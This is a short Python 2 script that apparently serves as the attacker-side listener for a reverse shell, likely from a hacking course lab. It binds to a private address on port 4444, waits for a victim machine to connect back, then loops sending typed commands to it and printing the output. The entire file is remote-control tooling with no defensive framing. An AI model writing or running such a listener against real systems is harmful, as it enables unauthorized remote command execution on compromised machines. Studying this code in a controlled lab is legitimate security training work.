#!/usr/bin/env python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("192.168.65.128", 4444))
listener.listen(0)
print("[+] waiting for incoming connection")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = raw_input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)

